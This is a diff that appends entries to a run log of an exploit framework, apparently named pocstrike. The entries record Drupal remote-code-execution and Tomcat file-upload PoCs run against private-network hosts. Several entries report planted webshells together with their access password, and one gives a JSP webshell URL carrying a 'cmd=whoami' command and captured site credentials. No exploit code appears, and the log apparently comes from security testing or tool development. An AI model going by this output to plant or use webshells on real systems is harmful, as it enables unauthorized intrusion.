@@ -670,3 +670,60 @@ KeyError: 'allow'
 [11:16:03] [INFO] running poc:'Tomcat arbitrary file upload' target 'http://192.168.2.245'
 [11:16:24] [-] {http://192.168.2.245} target connect failed!
 [11:16:24] [INFO] Scan completed,ready to print
+[20:20:40] [INFO] loading PoC script 'C:\Users\cr0ss4ire\Desktop\ps\ps_api\libs\pocstrike\pocs\_2_drupal_rce.py'
+[20:20:40] [INFO] PoC script "Drupal remote code execute" requires "beautifulsoup4==4.9.3:bs4" to be installed
+[20:20:40] [-] try install with "python -m pip install beautifulsoup4==4.9.3"
+[13:53:25] [INFO] loading PoC script 'C:\Users\cr0ss4ire\Desktop\ps\ps_api\libs\pocstrike\pocs\_2_drupal_rce.py'
+[13:53:25] [INFO] PoC script "Drupal remote code execute" requires "beautifulsoup4==4.9.3:bs4" to be installed
+[13:53:25] [-] try install with "python -m pip install beautifulsoup4==4.9.3"
+[14:32:13] [INFO] loading PoC script 'C:\Users\cr0ss4ire\Desktop\ps\ps_api\libs\pocstrike\pocs\_2_drupal_rce.py'
+[14:32:13] [INFO] PoC script "Drupal remote code execute" requires "beautifulsoup4==4.9.3:bs4" to be installed
+[14:32:13] [INFO] loading PoC script 'C:\Users\cr0ss4ire\Desktop\ps\ps_api\libs\pocstrike\pocs\_1_tomcat_upload.py'
+[14:32:13] [INFO] pocstrike got a total of 4 tasks
+[14:32:13] [INFO] running poc:'Drupal remote code execute' target 'http://192.168.2.243'
+[14:32:13] [+] target : http://192.168.2.243
+[14:32:13] [+] webshell : http://192.168.2.243/ZU8YtEmr3p.php
+[14:32:13] [+] pass : rebeyond
+[14:32:13] [INFO] running poc:'Drupal remote code execute' target 'http://192.168.2.243:8080'
+[14:32:13] [-] POC-2: Drupal remote code execute AttributeError occurs, 'NoneType' object has no attribute 'find'
+[14:32:13] [INFO] running poc:'Tomcat arbitrary file upload' target 'http://192.168.2.243'
+[14:32:14] [-] {http://192.168.2.243} server not vulnerable
+[14:32:14] [INFO] running poc:'Tomcat arbitrary file upload' target 'http://192.168.2.243:8080'
+[14:32:14] [+] target : http://192.168.2.243:8080
+[14:32:14] [+] webshell : http://192.168.2.243:8080/1638513134.jsp?pwd=023&cmd=whoami
+[14:32:14] [+] site_username : admin
+[14:32:14] [+] site_pass : passwd
+[14:32:14] [+] a : a
+[14:32:14] [+] b : b
+[14:32:14] [INFO] Scan completed,ready to print
+[16:39:15] [INFO] loading PoC script 'C:\Users\cr0ss4ire\Desktop\ps\ps_api\libs\pocstrike\pocs\_2_drupal_rce.py'
+[16:39:20] [INFO] loading PoC script 'C:\Users\cr0ss4ire\Desktop\ps\ps_api\libs\pocstrike\pocs\_2_drupal_rce.py'
+[16:39:20] [INFO] PoC script "Drupal remote code execute" requires "beautifulsoup4==4.9.3:bs4" to be installed
+[16:39:20] [INFO] PoC script "Drupal remote code execute" requires "beautifulsoup4==4.9.3:bs4" to be installed
+[16:39:21] [ERROR] PoC file "'_1_tomcat_uPload.py'" not found
+[16:39:21] [ERROR] PoC file "'_1_tomcat_uPload.py'" not found
+[16:39:21] [INFO] pocstrike got a total of 2 tasks
+[16:39:21] [INFO] pocstrike got a total of 4 tasks
+[16:39:21] [INFO] running poc:'Drupal remote code execute' target 'http://192.168.2.243'
+[16:39:21] [INFO] running poc:'Drupal remote code execute' target 'http://192.168.2.243:8080'
+[16:39:21] [+] target : http://192.168.2.243
+[16:39:21] [+] webshell : http://192.168.2.243/cG1EwyQWbe.php
+[16:39:21] [+] pass : rebeyond
+[16:39:21] [INFO] running poc:'Drupal remote code execute' target 'http://192.168.2.243:8080'
+[16:39:21] [-] POC-2: Drupal remote code execute AttributeError occurs, 'NoneType' object has no attribute 'find'
+[16:39:21] [INFO] running poc:'Drupal remote code execute' target 'http://192.168.2.243'
+[16:39:22] [+] target : http://192.168.2.243
+[16:39:22] [+] webshell : http://192.168.2.243/CASmNypfkV.php
+[16:39:22] [+] pass : rebeyond
+[16:39:22] [INFO] Scan completed,ready to print
+[16:39:24] [-] POC-2: Drupal remote code execute AttributeError occurs, 'NoneType' object has no attribute 'find'
+[16:39:24] [INFO] Scan completed,ready to print
+[18:09:28] [INFO] loading PoC script './upload/1/plugins\1637737614__1_tomcat_upload.py'
+[18:10:44] [INFO] loading PoC script './upload/1/plugins\1637739279__2_drupal_rce.py'
+[18:10:50] [INFO] PoC script "Drupal remote code execute" requires "beautifulsoup4==4.9.3:bs4" to be installed
+[18:13:20] [INFO] loading PoC script './upload/1/plugins\1637737614__1_tomcat_upload.py'
+[18:13:20] [INFO] loading PoC script './upload/1/plugins\1637739279__2_drupal_rce.py'
+[18:13:20] [INFO] PoC script "Drupal remote code execute" requires "beautifulsoup4==4.9.3:bs4" to be installed
+[18:15:20] [INFO] loading PoC script './upload/1/plugins\1637737614__1_tomcat_upload.py'
+[18:15:45] [INFO] loading PoC script './upload/1/plugins\1637739279__2_drupal_rce.py'
+[18:17:02] [INFO] PoC script "Drupal remote code execute" requires "beautifulsoup4==4.9.3:bs4" to be installed
